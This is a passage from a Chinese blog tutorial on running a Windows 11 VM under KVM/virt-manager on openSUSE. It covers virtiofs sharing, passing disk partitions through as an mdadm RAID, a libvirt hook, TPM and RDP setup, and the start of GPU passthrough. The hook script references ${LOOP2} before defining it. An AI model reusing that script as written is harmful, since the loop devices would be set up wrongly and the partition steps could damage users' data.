src="https://s2.loli.net/2024/02/22/yWUONuJ5z9CX2hg.png"></p><h2 id="配置-Guest-与-Host-间的数据共享"><a href="#配置-Guest-与-Host-间的数据共享" class="headerlink" title="配置 Guest 与 Host 间的数据共享"></a>配置 Guest 与 Host 间的数据共享</h2><p>为了方便直接通过 virt-manager 使用 VM，还可以进 VM 里安装 <a href="https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe">spice-guest-tools</a>，这样便能支持 Host 与 Guest 之间各种不管是文本还是图片的各种互相复制粘贴了</p><blockquote><p>如果剪贴板共享坏了，在 <code>服务</code> 里检查一下 <code>SPICE</code> 相关服务是不是挂了，如果经常挂的话建议配置为 <code>自动（延迟启动）</code></p></blockquote><p>对于 Host 与 Guest 之间的文件传输，使用 <code>共享文件夹</code> 似乎是一个不错的方法，将 VM 关机后进入设置中添加一个新的 <code>Filesystem</code> virtio 设备即可：</p><p><img src="https://s2.loli.net/2024/02/22/l9ASvEDfMkzyBUt.png"></p><p>接下来在 Guest VM 中安装 <a href="https://winfsp.dev/">WinFSP</a>（Windows File System Proxy），aka FUSE for Windows，用以挂载我们的共享文件夹</p><p><img src="https://s2.loli.net/2024/02/22/O8BhKgX5WY47tuR.png" alt="只安装 Core 其实也行"></p><p>前面我们已经安装过 virtio 驱动了，所以这里直接重启就行，打开设备管理器后我们便能看到一个 VirtIO FS 设备：</p><p><img src="https://s2.loli.net/2024/02/22/ksPrQjNEvtylWwA.png"></p><p>在 <code>服务</code> 中找到 <code>VirtIO-FS Service</code> 将其设为 <code>自动</code> ，<code>应用</code> 后点击 <code>启动</code>：</p><p><img src="https://s2.loli.net/2024/02/22/Pabrv2cozpUhKYu.png"></p><p>然后就 ok 了：</p><p><img src="https://s2.loli.net/2024/02/22/atYk9XEob2nf6h4.png"></p><blockquote><p>如果你在配置了共享文件夹后 VM 无法启动，且提示 <code>virtiofsd died unexpectedly</code> ，首先检查 <code>/var/log/libvirt/qemu/</code> 下的相关日志文件，若有类似 <code>libvirt:  error : cannot execute binary /usr/libexec/virtiofsd/virtiofsd: Permission denied</code> 这样的提示，则有可能是 <code>AppArmor</code> 的原因</p><p>解决方案是在 <code>/etc/apparmor.d/usr.sbin.libvirtd</code> 中适当的位置添加一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/&#123;lib,lib64,lib/qemu,libexec&#125;/virtiofsd/* PUx,<br></code></pre></td></tr></table></figure><p>之后 <code>sudo service apparmor restart</code> 重启 AppArmor，理论上此时便能正常启动了</p><p>若还是不行，则检查 <strong>libvirtd 服务是否存活</strong>，并进行重启</p></blockquote><blockquote><p>如果重启后你的 VM 无法连上网，可能是防火墙禁止了转发（通过 <code>iptables -A FORWARD -j ACCEPT</code> 命令启用转发），也可能是 libvirtd 莫名其妙挂了，<del>也可能是玄学问题多重启几遍就莫名其妙好了</del></p></blockquote><h2 id="Extra-同一物理磁盘分区直通-（not-so-recommend）"><a href="#Extra-同一物理磁盘分区直通-（not-so-recommend）" class="headerlink" title="_Extra. 同一物理磁盘分区直通_（not so recommend）"></a>_Extra. 同一物理磁盘分区直通_（not so recommend）</h2><blockquote><p>参考<a href="https://jianmin.dev/2020/jul/19/boot-your-windows-partition-from-linux-using-kvm/">这篇文章</a></p></blockquote><blockquote><p>注：如果你是在已有数据的分区上进行操作，<strong>请首先确保已经完成了数据备份</strong>！！！</p><p>注2：仅分区直通很容易把 Windows 干碎，然后出现各种问题，<strong>推荐大家还是买个双盘位电脑然后单独通一个盘给 Windows</strong></p></blockquote><p>虚拟机硬盘直通放在 4202 年自然已经不是一件稀奇的事情，但是通常的硬盘直通架构都是要将一整块物理硬盘通给单个虚拟机，若是你和笔者一样买了一部只有单盘位的笔记本（但是笔者的上一部笔记本有三盘位， <del>这次属于是经典考虑不周了</del> ），<strong>同时希望保留原有物理硬盘的 Windows 直接启动的能力</strong>，那么我们只能先预先分好区，之后再<strong>通过将分区建立为新的虚拟磁盘设备的方式</strong>将这部分分区作为一块新磁盘通给虚拟机</p><h3 id="创建-virtual-RAID-disk"><a href="#创建-virtual-RAID-disk" class="headerlink" title="创建 virtual RAID disk"></a>创建 virtual RAID disk</h3><p>首先载入点必要的驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe loop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe linear</span><br></code></pre></td></tr></table></figure><p>接下来创建三个文件作为 GPT 表、 EFI 分区、 GPT 元数据，并挂载为 loopback 设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=gpt bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi1 bs=1M count=100</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi2 bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f gpt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi2</span><br></code></pre></td></tr></table></figure><p>此时用 <code>losetup -a</code> 应当能看到三个 loopback 设备：</p><p><img src="https://s2.loli.net/2024/02/26/yTtnwX52JzfZYFc.png"></p><p>打开 YaST2 Partitioner （或是其他你所熟悉的能够查看分区信息的工具比如说 <code>fdisk -l</code>），找到原本属于 Windows 的那几个分区<strong>当中的数据分区</strong>：</p><blockquote><p>注：如果你原本就没有已经装好了的 Windows 分区，直接在待用分区上创建一个新的逻辑卷给 Windows 用就行</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/VWeF4iTcSs3qL9n.png" alt="需要注意的是，笔者在安装 Linux 时使用了新的 EFI 分区，而并非和 Windows 共用一个"></p><p>然后使用 madam （Multiple Disk and Device Administration）创建 RAID，以及注意不要把物理盘的 EFI 分区选进来了）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2</span><br></code></pre></td></tr></table></figure><p>然后进入 parted 进行分区，<strong>注意分区大小</strong>，注意 <code>mkpart</code>  子命令的格式为 <code>mkpart [part‐type name fs‐type] start end</code> ，<strong>注意自行计算分区起始位置</strong>：</p><blockquote><p>数据无价，谨慎操作！</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/md0</span><br>GNU Parted 3.6<br>Using /dev/md0<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>(parted) mkpart primary fat32 2048 206847                                 <br>(parted) mkpart msr 206848 239615                                         <br>(parted) mkpart primary ntfs 239616 1677961215                            <br>(parted) mkpart primary ntfs 1677961216 -2049                             <br>(parted) set 1 boot on                                                    <br>(parted) set 1 esp on                                                <br>(parted) set 2 msftres on                                                 <br>(parted) set 3 msftdata on                                                <br>(parted) set 4 hidden on                                                  <br>(parted) set 4 diag on                                                    <br>(parted) name 1 EFI                                                       <br>(parted) name 3 Windows                                                   <br>(parted) quit                                                             <br>Information: You may need to update /etc/fstab.<br></code></pre></td></tr></table></figure><p>然后用 <code>mkfs.msdos</code> 格式化 EFI 分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.msdos -F 32 -n EFI /dev/md0p1</span><br></code></pre></td></tr></table></figure><p>接下来编辑虚拟机磁盘：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">disk</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;block&quot;</span> <span class="hljs-attr">device</span>=<span class="hljs-string">&quot;disk&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">driver</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;qemu&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;raw&quot;</span> <span class="hljs-attr">cache</span>=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-attr">io</span>=<span class="hljs-string">&quot;native&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;/dev/md0&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;vda&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;virtio&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">boot</span> <span class="hljs-attr">order</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">address</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;pci&quot;</span> <span class="hljs-attr">domain</span>=<span class="hljs-string">&quot;0x0000&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;0x04&quot;</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;0x00&quot;</span> <span class="hljs-attr">function</span>=<span class="hljs-string">&quot;0x0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">disk</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后重新把我们的 Windows 安装光碟与 virtio 驱动挂上去，放到第一个启动：</p><blockquote><p>注：你需要在启动时 <code>press any key</code> 才会从 CDROM 启动</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/CKQAUWexdacbl3m.png"></p><p>重启后首先按惯例进入安装界面装载 virtio 驱动：</p><p><img src="https://s2.loli.net/2024/02/24/ekb9Qsd82oOc1Nf.png"></p><p>完成后 <code>shift + f10</code> 唤出 cmd，在 <code>diskpart</code> 中找到 EFI 分区，分配驱动号 <code>B</code>：</p><p><img src="https://s2.loli.net/2024/02/24/KOLZMNRl1o6iu3q.png"></p><p>最后通过如下命令将 virtio 驱动注入 C 盘，并在 EFI 分区中配置好启动项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">dism /image:c:\ /add-driver /driver:e:\viostor\w11\amd64\viostor.inf<br>bcdboot C:\Windows /s B: /f ALL<br></code></pre></td></tr></table></figure><p>重启，重新进行账户验证，然后就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/24/P4IqVFUflRMNtsa.png" alt="唉👴的桌面这么私密的空间都给大家看了.jpg"></p><h3 id="通过-libvirt-hook-配置-RAID-自创建与卸载"><a href="#通过-libvirt-hook-配置-RAID-自创建与卸载" class="headerlink" title="通过 libvirt hook 配置 RAID 自创建与卸载"></a>通过 libvirt hook 配置 RAID 自创建与卸载</h3><p>RAID 的配置不能持久化，因此需要我们写一个脚本来在每次启动 VM 前先检查是否创建了 RAID，若否，则先创建 RAID 再启动</p><p>这里我们可以通过创建 <code>/etc/libvirt/hooks/qemu</code> 脚本来实现 VM 启动前的 hook，在其中写入如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     <span class="hljs-comment"># startup logic here</span><br>     modprobe loop<br>     modprobe linear<br>     LOOP1=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/gpt<br>     LOOP2=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi1<br>     LOOP3=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP3&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi2<br>     mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2<br>   <span class="hljs-keyword">else</span><br>     <span class="hljs-comment"># shutdown logic here</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Stopping array&quot;</span><br>     mdadm --stop /dev/md0<br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;removing loopback devices&quot;</span><br>     losetup | grep -i <span class="hljs-string">&quot;win11vm&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs sudo losetup -d<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="配置-TPM-直通"><a href="#配置-TPM-直通" class="headerlink" title="配置 TPM 直通"></a>配置 TPM 直通</h3><p><strong>可信平台模块</strong>（<a href="https://learn.microsoft.com/zh-cn/windows/security/hardware-security/tpm/trusted-platform-module-overview">Trusted Platform Module</a>）芯片是主板上的一块用来确保物理安全性的芯片，Windows 用其确保系统的物理安全性，包括 Pin 码等，自 Win 11 起 TPM 成为了操作系统启动的硬性要求</p><p>QEMU 虽然可以模拟 vTPM，但是与物理机 TPM 的非一致性会让系统在 Win 物理机与虚拟机间切换时造成一定的问题（在 Windows 看来这破坏了系统的完整性），由于在 Linux PC 上我们通常并不使用 TPM 特性，因此这里我们可以选择直接将 TPM 模块直通给虚拟机</p><p>TPM 模块的设备路径通常为 <code>/dev/tpm0</code> （v1.2）与 <code>/dev/tpmrm0</code> （v2.0），通常我们应当将前者进行直通才能达到完整直通的效果：</p><p><img src="https://s2.loli.net/2024/02/26/wnPzW97uJxqKXFI.png" alt="真是简简又单单，你们有没有这样的 virt-manager 啊">)</p><p>然后就能用 pin 登录了：</p><p><img src="https://s2.loli.net/2024/02/28/GFo179iyWNLetIX.png"></p><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a><em>可能遇到的问题</em></h3><ul><li>Host 重启至 Windows 后 WLAN 适配器丢失：在网络适配器里卸载 Kernel Mode Debugger，然后在管理里选择无线网卡设备，<strong>卸载设备</strong>，扫描设备更改，然后右键桌面右下角网络图标打开 <code>诊断网络问题 </code>，启用 WLAN 适配器即可</li></ul><h1 id="0x02-在-Host-侧配置-RDP-连接"><a href="#0x02-在-Host-侧配置-RDP-连接" class="headerlink" title="0x02. 在 Host 侧配置 RDP 连接"></a>0x02. 在 Host 侧配置 RDP 连接</h1><h2 id="配置-RDP-硬体加速"><a href="#配置-RDP-硬体加速" class="headerlink" title="配置 RDP 硬体加速"></a>配置 RDP 硬体加速</h2><p>运行 <code>gpedit.msc</code> 找到 <code>*计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;远程会话环境</code>，在其中配置 RDP 硬体加速，以此获得更好的 RDP 性能：</p><p><img src="https://s2.loli.net/2024/02/26/ILEM9OrqKZFApou.png"></p><p>然后打开注册表编辑器路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations</code> ，新建一个名为 <code>DWMFRAMEINTERVAL</code> 的 DWORD 值并设为 <code>15</code>：</p><p><img src="https://s2.loli.net/2024/02/26/gXABCzNwMH8KRYE.png"></p><p>重启即可</p><h2 id="配置-RDP-连接"><a href="#配置-RDP-连接" class="headerlink" title="配置 RDP 连接"></a>配置 RDP 连接</h2><blockquote><p>如果你的 RDP 连接没有声音，可以参见 <a href="https://www.anyviewer.cn/how-to/rdp-audio-not-working-6540.html">这个链接</a> 进行修复</p><p>如果无法连接上 Guest ，也可以检查一下是不是 Windows 防火墙的问题</p></blockquote><h3 id="使用-xfreerdp-仅运行单个应用"><a href="#使用-xfreerdp-仅运行单个应用" class="headerlink" title="使用 xfreerdp 仅运行单个应用"></a>使用 xfreerdp 仅运行单个应用</h3><p>首先安装上 freedrp：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> freerdp</span><br></code></pre></td></tr></table></figure><p>接下来输入如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;explorer.exe&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/22/GgCDkhwiznLF1fZ.png" alt="碉堡了好吗"></p><p>这里的 RDP 命令帮我们配置好了共享 <code>/home</code> 文件夹和剪贴板，所以你可以<strong>直接往 VM 里粘贴包括文件在内的东西</strong>，也可以在 VM 中访问 Host 侧的文件夹：）</p><blockquote></blockquote><h3 id="使用-sdl-freerdp"><a href="#使用-sdl-freerdp" class="headerlink" title="使用 sdl-freerdp"></a><em>使用 sdl-freerdp</em></h3><blockquote><p>和 wlfreerdp 一样，不支持仅转发单个应用（似乎是 wayland 缺失了某些特性）</p></blockquote><p>zypper 官方源里没有，可以手动添加，也可以像笔者一样通过 flatpak 进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.freerdp.FreeRDP</span><br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak run com.freerdp.FreeRDP /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone</span><br></code></pre></td></tr></table></figure><h3 id="在应用列表中添加-Windows-程序图标"><a href="#在应用列表中添加-Windows-程序图标" class="headerlink" title="在应用列表中添加 Windows 程序图标"></a>在应用列表中添加 Windows 程序图标</h3><p>把自己想要运行的 Windows 程序路径写成 Desktop Entry 就行，后缀名改为 <code>.desktop</code> 并放在 <code>/usr/share/applicaitions/</code> 目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Desktop Entry]<br><span class="hljs-comment"># 该入口的类型</span><br>Type=Application<br><span class="hljs-comment"># 是否显示终端（可选）</span><br>Terminal=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 点击该入口执行的命令</span><br>Exec=xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;VM 里的可执行程序路径名&quot;</span><br><span class="hljs-comment"># 该程序名称</span><br>Name=Name of Application<br><span class="hljs-comment"># 入口显示的图标路径（可选）</span><br>Icon=/path/to/icon<br></code></pre></td></tr></table></figure><h1 id="0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了"><a href="#0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了" class="headerlink" title="0x03. 实现显卡直通 ，这样就能玩👴最爱的 Genshin Impact 了"></a>0x03. 实现显卡直通 <del>，这样就能玩👴最爱的 <code>Genshin Impact</code> 了</del></h1><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/app-gpu-passthru.html">SUSE - Configuring GPU Pass-Through for NVIDIA cards</a></p></blockquote><p>众所周知，《原神》是由米哈游自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「提瓦特」的幻想世界，在这里，被神选中的人将被授予「神之眼」，导引元素之力。你将扮演一位名为「旅行者」的神秘角色，在自由的旅行中邂逅性格各异、能力独特的同伴们，和他们一起击败强敌，找回失散的亲人——同时，逐步发掘「原神」的真相。我现在每天玩原神都能赚150原石，每个月差不多5000原石的收入， 也就是现实生活中每个月5000美元的收入水平，换算过来最少也30000人民币，虽然我 只有14岁，但是已经超越了中国绝大多数人(包括你)的水平，这便是原神给我的骄傲的资本…</p><p><img src="https://s2.loli.net/2024/02/22/kNXAmoqZslUjEYb.png" alt="差不多得了😅屁大点事都要拐上原神，原神一没招你惹你，二没干伤天害理的事情，到底怎么你了让你一直无脑抹黑，米哈游每天费尽心思的文化输出弘扬中国文化，你这种喷子只会在网上敲键盘诋毁良心公司，中国游戏的未来就是被你这种人毁掉的😅"></p><p><del>扯得有些远了，</del> 总而言之有的时候我们想要在 Windows 上进行一些需要用显卡才能完成的任务，亦或是使用显卡进行图形加速等，virt-manager 默认提供的 RedHat QXL 终究只是一个由 QEMU 进行模拟的设备，性能上自然很难与真正的显卡相比拟</p><p>而笔者的笔记本刚好有两个显卡：一个是 Intel 的核显，另一个是一张 NVIDIA 的卡，因为笔者日常也不用这台电脑炼丹（ <del>再说了就一张小破 4060 能练个啥玩意出来</del> ），因此笔者决定将 N 卡直通到 VM 当中以提高 VM 的图形化性能， <del>同时闲暇之余还能打开 VM 玩玩游戏这样子</del></p><h2 id="配置-IOMMU"><a href="#配置-IOMMU" class="headerlink" title="配置 IOMMU"></a>配置 IOMMU</h2><p>在 <a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">《系统虚拟化导论》</a> 中我们知道集成在北桥上的 IOMMU 可以通过 DMA 重映射与中断重映射的方式让我们实现 I&#x2F;O 虚拟化：</p><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png"></p><p>IOMMU 默认是关闭的，因此首先我们要先启用 IOMMU 这一功能，首先检查一下你是否有两张卡以及是否在 UEFI 里开启了虚拟化相关特性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg | grep -e <span class="hljs-string">&quot;Directed I/O&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci | grep -i <span class="hljs-string">&quot;vga&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/22/SKYOdgF1s9U2Za4.png" alt="image.png"></p><blockquote><p>如果你只有一张显示卡的话，<strong>那笔者不推荐弄显卡直通</strong>，因为同一时间只有一个系统能够占用显卡，Guest 拿掉之后 Host 肯定是没有图形输出的，Guest 关机后才能回到 Host 图形界面，<strong>这种直通还不如直接装双系统后重启回 Windows</strong></p></blockquote><p>在 <code>/etc/default/grub</code> 的 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 参数中添加 <code>intel_iommu=on iommu=pt rd.driver.pre=vfio-pci</code> （AMD CPU 则添加 <code>iommu=pt amd_iommu=on rd.driver.pre=vfio-pci</code>），之后通过如下命令更新 grub：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span> <br></code></pre></td></tr></table></figure><p>重启后通过 <code>dmesg |  grep -e DMAR -e IOMMU</code> 命令我们便能看到 IOMMU 已经开启：</p><p><img src="https://s2.loli.net/2024/02/22/kDgealrxURMKE6d.png" alt="image.png"></p><p>接下来我们运行 <code>lspci -nn | grep -i nvidia</code> 命令找到 N 卡后面的设备 id,记录下这串数字：</p><p><img src="https://s2.loli.net/2024/02/22/fNKQEu2z8VSoHOv.png" alt="image.png"></p><h2 id="实现显卡动态直通"><a href="#实现显卡动态直通" class="headerlink" title="实现显卡动态直通"></a>实现显卡动态直通</h2><p>大部分双显卡直通的教程上来就是让把老 N 卡的 nouveau 驱动给卸了，但是笔者<a href="https://arttnba3.cn/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/">一开始就装了 N 卡闭源驱动</a>，现在再给卸了有点不太现实，而且万一以后有空了也想用这台电脑小练点丹也说不定，所以这里笔者选择配置<strong>动态显卡重装载策略</strong>——</p><ul><li>默认卸载 N 卡驱动，在需要时再装载 N 卡驱动</li><li>在 VM 启动时卸载 N 卡驱动，在 VM 结束运行后再重新装载，<strong>桌面环境则仅在核显上运行</strong>（其实 Linux 桌面环境通常情况下用核显的性能基本上都是足够的）</li></ul><h3 id="配置-VFIO"><a href="#配置-VFIO" class="headerlink" title="配置 VFIO"></a>配置 VFIO</h3><p>首先配置 VFIO，这里我们要防止 nvidia 驱动在开机时便被装载（后面用到再手动装载，否则会比较麻烦），首先在 <code>/etc/modprobe.d/</code> 中创建文件 <code>vfio.conf</code> 并写入我们刚刚获取到的标识符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> vfio-pci ids=<span class="hljs-number">10</span>de:<span class="hljs-number">28</span>a0<br></code></pre></td></tr></table></figure><p>然后创建文件 <code>/etc/dracut.conf.d/gpu-passthrough.conf</code> 以装载 <a href="https://documentation.suse.com/zh-cn/sles/15-SP3/html/SLES-all/gloss-vt-glossary.html#gloss-vt-acronym-vfio">VFIO</a> 驱动：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">add_drivers+=<span class="hljs-string">&quot;vfio vfio_iommu_type1 vfio_pci vfio_virqfd&quot;</span><br></code></pre></td></tr></table></figure><p>接下来使用 dracut 重新生成 initrd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dracut --force /boot/initrd $(uname -r)<br></code></pre></td></tr></table></figure><p>然后为 Guest VM 禁用 